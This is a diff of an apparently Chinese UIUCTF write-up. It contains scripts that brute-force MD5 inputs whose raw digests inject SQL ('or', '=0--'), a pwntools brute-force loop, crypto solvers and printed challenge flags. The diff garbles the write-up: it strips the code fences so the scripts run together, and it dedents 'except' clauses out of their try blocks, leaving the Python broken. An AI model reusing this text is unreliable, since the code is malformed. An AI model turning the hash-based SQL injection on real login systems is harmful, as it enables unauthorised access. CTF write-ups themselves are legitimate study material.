@@ -67,7 +67,7 @@ img
 sql 查询失败会报错？这个unicode是hashed？
 img
 
- 
+
 
 查不到key会返回空
 
@@ -200,9 +200,11 @@ while True:
             print(flag)
             p.close()
             break
-        except KeyboardInterrupt:
+        
+except KeyboardInterrupt:
             exit(0)
-        except:           
+        
+except:           
             p.close()
     if flag[-1] == "}":
         break
@@ -333,7 +335,8 @@ Goose Chase
 
 ❝
 
-The threat group GREGARIOUS GOOSE has hacked into SIGPwny servers and stolen one of our flags! Can you use the evidence to recover the flag? WARNING: This challenge contains malware that may read images on your hard disk. Ensure that you do not have anything sensitive present. 威胁组织合群鹅黑进了SIGPwny的服务器，偷走了我们的一面旗帜！你能用证据找回旗子吗？警告:此挑战包含恶意软件，可能会读取您硬盘上的图像。确保你没有任何敏感的礼物。
+The threat group GREGARIOUS GOOSE has hacked into SIGPwny servers and stolen one of our flags! Can you use the evidence to recover the flag? WARNING: This challenge contains malware that may read images on your hard disk. Ensure that you do not have anything sensitive present. 威胁组织合群鹅黑进了SIGPwny的服务器，偷走了我们的一面旗帜！你能用证据找回旗子吗？警告:
+此挑战包含恶意软件，可能会读取您硬盘上的图像。确保你没有任何敏感的礼物。
 
 题目给了一个流量包和一个两百多兆的dmp文件。流量包第二个带了一个PE文件，不知道是不是关键程序，因为不会分析流量包
 
@@ -436,29 +439,9 @@ async function pay() {
       document.getElementById("alert").innerText = j["message"];
       setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
     }
-```
-
-
-
-```
 // todo: convert md5 to hex string instead of latin1??
-```
-
-
-
-```
 `SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`
-```
-
-
-
-```
 `SELECT * FROM keys WHERE kid = ''`
-```
-
-
-
-```
 import hashlib
 import string
 
@@ -473,30 +456,15 @@ for i in range(0, len(str_list)):
                     str_hash = hashlib.md5(tmp.encode('utf-8')).digest()
                     if ("'or 1;" in str(str_hash)[2:-1] or "'=0;"  in str(str_hash)[2:-1] ):
                         print(tmp)
-```
-
-
-
-```
 import hashlib
 
 a='bQTTC'
 b=hashlib.md5(a.encode('utf-8')).digest()
 print(b)
-#print(dir(b))
-```
-
-
-
-```
+    #print(dir(b))
 'or'
 '=0--
 '=0 (如果在末尾)
-```
-
-
-
-```
 import hashlib
 import string
 
@@ -512,17 +480,7 @@ for i in range(0, len(str_list)):
                         str_hash = hashlib.md5(tmp.encode('utf-8')).digest()
                         if ("'or'"  in str(str_hash)[2:-1]  or  "'=0--"  in str(str_hash)[2:-1]  or "'=0'"==str(str_hash)[:-4] or "'or '"  in str(str_hash)[2:-1]  or "' or'"  in str(str_hash)[2:-1] ):
                             print(tmp)
-```
-
-
-
-```
 xdax82'or'1+xd7Vpx1bwxd7.xb6
-```
-
-
-
-```
 from pwn import *
 context.log_level = "error"
 context.arch = "amd64"
@@ -564,19 +522,16 @@ while True:
             print(flag)
             p.close()
             break
-        except KeyboardInterrupt:
+        
+except KeyboardInterrupt:
             exit(0)
-        except:           
+        
+except:           
             p.close()
     if flag[-1] == "}":
         break
 
 io.interactive()
-```
-
-
-
-```
 import z3
 
 length=6
@@ -623,20 +578,10 @@ if x.check()==z3.sat:
 else:
     print("failed") 
 #705965527 780663452 341222189 465893239 966221407 217433792
-#uiuctf{2a142dd72e87fa9c1456a32d1bc4f77739975e5fcf5c6c0}
-```
-
-
-
-```
+    #uiuctf{2a142dd72e87fa9c1456a32d1bc4f77739975e5fcf5c6c0}
 FAILURE_BUCKET_ID:  WRONG_SYMBOLS_80000003_ntdll.dll!NtWaitForSingleObject
 
 WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/Goose_exe/0_0_0_0/666dca80/unknown/0_0_0_0/bbbbbbb4/80000003/00000000.htm?Retriage=1
-```
-
-
-
-```
 from Crypto.Util.number import *
 from itertools import cycle
 data = open("ct","rb").read()
@@ -645,11 +590,6 @@ key2 = data[-1] ^ ord(b"}")
 key = long_to_bytes(key1) + long_to_bytes(key2)
 for i,j in zip(data,cycle(key)):
     print(chr(i^j),end="")
-```
-
-
-
-```
 from sympy import *
 from Crypto.Util.number import *
 x1,x2,x3,x4,x5 = symbols("x1 x2 x3 x4 x5")
@@ -664,11 +604,6 @@ e = [q1,q2,q3,q4,q5]
 res = solve(e)
 for i in res:
     print(long_to_bytes(res[i]).decode(),end="")
-```
-
-
-
-```
 [
   [p, 0, x, 0, x],
   [0, x, 0, x, 0],
@@ -676,11 +611,6 @@ for i in res:
   [0, q, 0, r, 0],
   [x, 0, x, 0, 0]
 ]（x表示能控制的地方）
-```
-
-
-
-```
 [
   [p, 0, 0, 0, 0],
   [0, 1, 0, 0, 0],
@@ -688,11 +618,6 @@ for i in res:
   [0, q, 0, r, 0],
   [0, 0, 1, 0, 0]
 ]
-```
-
-
-
-```
 from Crypto.Util.number import *
 import math
 n = 158794636700752922781275926476194117856757725604680390949164778150869764326023702391967976086363365534718230514141547968577753309521188288428236024251993839560087229636799779157903650823700424848036276986652311165197569877428810358366358203174595667453056843209344115949077094799081260298678936223331932826351
@@ -708,11 +633,6 @@ phi = (p-1)*(q-1)
 d = pow(e,-1,phi)
 m = pow(c,d,n)
 print(long_to_bytes(m))
-```
-
-
-
-```
 from Crypto.Util.number import *
 def solve(ww):
     a =  [66128, 61158, 36912, 65196, 15611, 45292, 84119, 65338]
@@ -761,7 +681,7 @@ for ee in range(len(ct)):
         pp+=str(tt)
     flag+=chr(int(pp,2))
 print(flag)
-#uiuctf{i_g0t_sleepy_s0_I_13f7_th3_fl4g}
+    #uiuctf{i_g0t_sleepy_s0_I_13f7_th3_fl4g}
 ```
 
 
